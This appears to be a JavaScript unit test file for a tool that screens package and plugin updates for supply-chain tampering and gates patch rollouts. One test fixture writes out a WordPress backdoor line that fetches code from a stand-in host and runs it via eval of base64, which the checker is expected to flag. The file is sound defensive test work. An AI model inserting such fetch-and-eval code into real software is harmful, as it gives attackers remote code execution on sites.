// Unit tests for the safety-critical core: release check, sensitive-change detector, lanes, gate baseline.
import test from 'node:test';
import assert from 'node:assert';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { releaseCheck } from '../src/release-check.mjs';
import { assessChanges } from '../src/sensitive.mjs';
import { decideLane } from '../src/policy.mjs';
import { runGate } from '../src/gate.mjs';
import { DEFAULTS } from '../src/config.mjs';
import { matchGlob } from '../src/util.mjs';

function pkgDir(files) {
  const d = fs.mkdtempSync(path.join(os.tmpdir(), 'ap-test-'));
  for (const [f, c] of Object.entries(files)) { fs.mkdirSync(path.dirname(path.join(d, f)), { recursive: true }); fs.writeFileSync(path.join(d, f), c); }
  return d;
}

test('release check holds a fix that adds a postinstall script', () => {
  const a = pkgDir({ 'package/package.json': '{"scripts":{}}', 'package/index.js': 'module.exports=1' });
  const b = pkgDir({ 'package/package.json': '{"scripts":{"postinstall":"node x.js"}}', 'package/index.js': 'module.exports=1' });
  const r = releaseCheck(a, b);
  assert.equal(r.suspicious, true);
  assert.match(r.findings.join(), /postinstall/);
});

test('release check holds eval + remote fetch added to runtime code (WordPress backdoor shape)', () => {
  const a = pkgDir({ 'seo/seo.php': '<?php echo 1;' });
  const b = pkgDir({ 'seo/seo.php': "<?php $p = wp_remote_retrieve_body(wp_remote_get('http://x.example/r')); @eval(base64_decode($p));" });
  assert.equal(releaseCheck(a, b).suspicious, true);
});

test('release check only warns when a CLI/tooling file adds child_process (marked 4 false positive)', () => {
  const a = pkgDir({ 'package/package.json': '{}', 'package/lib/m.js': 'x' });
  const b = pkgDir({ 'package/package.json': '{}', 'package/lib/m.js': 'x', 'package/bin/cli.js': "require('child_process').spawn('man')" });
  const r = releaseCheck(a, b);
  assert.equal(r.suspicious, false);
  assert.equal(r.warnings.length, 1);
});

test('sensitive detector requires a human for key generation (Next.js lab lesson)', () => {
  const diff = "+++ b/lib/session.js\n+const { privateKey } = crypto.generateKeyPairSync('rsa', { modulusLength: 2048 });\n";
  const r = assessChanges(diff);
  assert.equal(r.humanApprovalRequired, true);
  assert.match(r.reasons.join(), /key/);
});

test('sensitive detector lets an ordinary API migration through, with review notes only for auth code', () => {
  assert.equal(assessChanges('+  return marked.parse(md);\n').humanApprovalRequired, false);
  const r = assessChanges("+  if ( ! current_user_can( 'manage_options' ) ) { wp_send_json_error( null, 403 ); }\n");
  assert.equal(r.humanApprovalRequired, false);
  assert.ok(r.reviewNotes.length > 0);
});

test('lanes: KEV or no-login high severity is urgent; logged-in medium is routine with cooldown', () => {
  const cfg = { policy: { cooldownDays: 3 } };
  assert.equal(decideLane({ exploited: true, cvss: { score: 5 } }, cfg).lane, 'urgent');
  assert.equal(decideLane({ unauth: true, cvss: { score: 7.5 } }, cfg).lane, 'urgent');
  const r = decideLane({ unauth: false, cvss: { score: 6.4 }, fix: { ageDays: 1 } }, cfg);
  assert.equal(r.lane, 'routine');
  assert.equal(r.cooldown, true);
});

test('gate: only new failures block; known failures are tolerated; restart re-check runs for servers', async () => {
  let restarts = 0;
  const adapter = {
    hasServer: true,
    restart: async () => { restarts++; },
    checks: async (ctx, dir, { phase }) => [
      { name: 'page /', pass: true },
      { name: 'flow newsletter', pass: false, detail: 'deactivated earlier' },
      ...(phase === 'after-restart' ? [{ name: 'flow session survives restart', pass: false, detail: '401' }] : []),
    ],
  };
  const g = await runGate(adapter, { cfg: { checks: {} } }, '/x', { known: ['flow newsletter'], restartCheck: true });
  assert.equal(restarts, 2);
  assert.equal(g.pass, false);
  assert.deepEqual(g.newFailures.map((c) => c.name), ['flow session survives restart (after restart)']);
});

test('owned/protected path globs', () => {
  assert.ok(matchGlob('wp-content/mu-plugins/hotfix-x.php', 'wp-content/mu-plugins/**'));
  assert.ok(matchGlob('src/app.js', 'src/**'));
  assert.ok(!matchGlob('package.json', 'src/**'));
  assert.ok(DEFAULTS.protectedPaths.some((g) => matchGlob('test/app.test.js', g)));
});
